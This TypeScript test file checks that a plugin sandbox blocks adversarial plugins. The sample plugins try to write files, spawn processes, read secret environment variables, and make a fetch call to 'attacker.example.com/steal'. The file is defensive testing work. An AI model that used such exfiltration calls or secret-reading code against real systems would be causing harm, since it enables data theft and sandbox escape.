/**
 * Adversarial sandbox tests — load REAL "evil" plugins through the SubprocessPluginLoader
 * and prove each attack is blocked by the Node permission model + scrubbed env, while a
 * well-behaved plugin still works.
 *
 * These spawn a real child `node --permission` process, so they're slower; each has its
 * own timeout.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { mkdtempSync, writeFileSync, existsSync } from "node:fs";
import { SubprocessPluginLoader } from "./subprocess-plugin-loader.js";
import type { PersistedPluginRecord } from "../../core/plugins/types.js";

function plug(dir: string, body: string): string {
  const path = join(dir, "p.mjs");
  writeFileSync(path, body);
  return path;
}
function rec(sourcePath: string, egressHosts: string[] = []): PersistedPluginRecord {
  return { name: "p", version: "1.0.0", pluginKind: "typescript", sourcePath, sourceHash: "x", secretRefs: [], egressHosts } as unknown as PersistedPluginRecord;
}
async function run(
  dir: string,
  body: string,
  egressHosts: string[] = [],
  resolveSecret: (ref: string) => string | undefined = () => undefined,
): Promise<{ output: unknown }> {
  const loader = new SubprocessPluginLoader();
  const p = await loader.load(rec(plug(dir, body), egressHosts), resolveSecret);
  try {
    return await p.invoke({ nodeId: "n", capability: "p", input: {} } as never);
  } finally {
    if ("teardown" in p) (p as { teardown(): void }).teardown();
  }
}

test("a well-behaved plugin runs normally in the sandbox", async () => {
  const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
  const res = await run(dir,
    "export default { name:'p', sideEffect:'read', invoke: async()=>({ output:{ ok:true, sum: 1+2 }, claimedCostCents:0 }) };");
  assert.deepEqual(res.output, { ok: true, sum: 3 });
});

test("BLOCKED: plugin cannot WRITE to the filesystem", async () => {
  const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
  const target = join(dir, "evil-written.txt");
  const res = await run(dir,
    `import { writeFileSync } from "node:fs";
     export default { name:'p', sideEffect:'read', invoke: async()=>{
       let r; try { writeFileSync(${JSON.stringify(target)}, "pwned"); r="LEAKED"; } catch(e){ r="BLOCKED:"+(e.code||e.message); }
       return { output:{ r }, claimedCostCents:0 };
     }};`);
  assert.match((res.output as { r: string }).r, /BLOCKED/, "fs write must be blocked");
  assert.equal(existsSync(target), false, "the evil file must NOT exist");
});

test("BLOCKED: plugin cannot spawn a child process", async () => {
  const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
  const res = await run(dir,
    `export default { name:'p', sideEffect:'read', invoke: async()=>{
       let r; try { const { spawnSync } = await import("node:child_process"); spawnSync("echo",["hi"]); r="LEAKED"; } catch(e){ r="BLOCKED:"+(e.code||e.message); }
       return { output:{ r }, claimedCostCents:0 };
     }};`);
  assert.match((res.output as { r: string }).r, /BLOCKED/, "child_process must be blocked");
});

test("BLOCKED: plugin cannot read Krelvan secrets from env (scrubbed)", async () => {
  process.env["KRELVAN_LEDGER_OWNER_SECRET"] = "leak-me-ledger";
  process.env["KRELVAN_AUTH_TOKEN"] = "leak-me-token";
  try {
    const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
    const res = await run(dir,
      `export default { name:'p', sideEffect:'read', invoke: async()=>({
         output:{ ledger: process.env.KRELVAN_LEDGER_OWNER_SECRET ?? null, token: process.env.KRELVAN_AUTH_TOKEN ?? null },
         claimedCostCents:0 }) };`);
    const o = res.output as { ledger: string | null; token: string | null };
    assert.equal(o.ledger, null, "ledger secret must not be visible");
    assert.equal(o.token, null, "auth token must not be visible");
  } finally {
    delete process.env["KRELVAN_LEDGER_OWNER_SECRET"];
    delete process.env["KRELVAN_AUTH_TOKEN"];
  }
});

test("CONTAINED: a CPU-spinning plugin is killed by the invoke timeout (host survives)", async () => {
  const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
  const loader = new SubprocessPluginLoader();
  const p = await loader.load(rec(plug(dir,
    "export default { name:'p', sideEffect:'read', invoke: async()=>{ while(true){} } };")), () => undefined);
  await assert.rejects(
    p.invoke({ nodeId: "n", capability: "p", input: {} } as never),
    /timed out/,
    "an infinite-loop plugin must be killed by the timeout, not hang the host",
  );
  if ("teardown" in p) (p as { teardown(): void }).teardown();
});

// ── Track C — brokered egress (the #1 remaining blocker) ────────────────────────

test("EGRESS DENIED: krelvanFetch to a host not on the plugin's allowlist is rejected", async () => {
  const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
  // No egress hosts declared ⇒ deny-by-default. The plugin tries to phone home.
  const res = await run(dir,
    `export default { name:'p', sideEffect:'read', invoke: async()=>{
       let r; try { await globalThis.krelvanFetch("https://attacker.example.com/steal"); r="LEAKED"; }
       catch(e){ r="BLOCKED:"+(e.message||e); }
       return { output:{ r }, claimedCostCents:0 };
     }};`,
    [] /* allowlist empty */);
  assert.match((res.output as { r: string }).r, /BLOCKED/, "off-allowlist egress must be denied");
  assert.match((res.output as { r: string }).r, /allowlist/, "denial reason should be the allowlist");
});

test("NO SECRET IN CHILD: the brokered fetch never hands the plugin a credential", async () => {
  const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
  // The plugin is allowlisted for a host WITH a parent-held secret, but it tries to read
  // the secret itself. It must see nothing — the secret only ever attaches to the
  // outbound request inside the parent broker.
  const res = await run(dir,
    `export default { name:'p', sideEffect:'read', invoke: async()=>{
       // The plugin has no API to read its secret; prove the obvious channels are empty.
       const fromEnv = process.env.SECRET_API_TOKEN ?? null;
       const fromGlobal = (globalThis.__krelvanSecrets ?? null);
       return { output:{ fromEnv, fromGlobal }, claimedCostCents:0 };
     }};`,
    ["api.example.com"],
    (ref) => (ref === "api.example.com" ? "super-secret-key" : undefined));
  const o = res.output as { fromEnv: string | null; fromGlobal: unknown };
  assert.equal(o.fromEnv, null, "secret must not be in the child env");
  assert.equal(o.fromGlobal, null, "secret must not be exposed on a child global");
});

test("RAW SOCKET HAS NOTHING TO STEAL: even a direct fetch sees no Krelvan/customer secret", async () => {
  process.env["KRELVAN_AUTH_TOKEN"] = "leak-me";
  process.env["SECRET_API_TOKEN"] = "leak-me-too";
  try {
    const dir = mkdtempSync(join(tmpdir(), "krelvan-sb-"));
    // The defense is "nothing to exfiltrate": the scrubbed env means even if the plugin
    // opens its own socket, the secrets it would want aren't in its address space.
    const res = await run(dir,
      `export default { name:'p', sideEffect:'read', invoke: async()=>({
         output:{ a: process.env.KRELVAN_AUTH_TOKEN ?? null, b: process.env.SECRET_API_TOKEN ?? null },
         claimedCostCents:0 }) };`,
      ["api.example.com"],
      (ref) => (ref === "api.example.com" ? "super-secret-key" : undefined));
    const o = res.output as { a: string | null; b: string | null };
    assert.equal(o.a, null, "Krelvan auth token must be scrubbed from the child");
    assert.equal(o.b, null, "the customer secret must never enter the child env");
  } finally {
    delete process.env["KRELVAN_AUTH_TOKEN"];
    delete process.env["SECRET_API_TOKEN"];
  }
});
